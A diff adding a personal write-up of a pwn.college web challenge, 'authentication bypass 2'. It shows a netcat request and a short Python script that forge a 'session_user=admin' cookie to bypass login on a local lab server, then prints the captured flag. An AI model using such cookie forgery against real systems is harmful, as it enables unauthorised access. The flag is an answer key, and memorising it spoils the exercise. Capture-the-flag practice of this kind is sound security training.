@@ -1,0 +1,50 @@
+# challenge: authentication bypass 2
+
+📅 2026-01-29
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the challenge works almost the same as previous one
+this time it doesnt check for session_user in query string but in cookie header
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET / HTTP/1.1'
+        'Cookie: session_user=admin'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'from pwn import *'
+        'import requests'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/"'
+        'cookies = {'
+                '"session_user" : "admin"'
+                '}'
+        'r = requests.get(url, cookies=cookies)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to set Cookie header(s).
+it works almost the same as others, but it has a name and a value
+so u can store more cookies
+in python if u have to send a cookie in the request u have to specify which cookie:
+requests.get(url, cookies=[COOKIES U CRAFTED])
+
+## 🏁 Flag  
+pwn.college{g8m5-OJeQ-pWnW9tqZOE8G9VUa1.QXycTN2wCO4IDOxEzW}
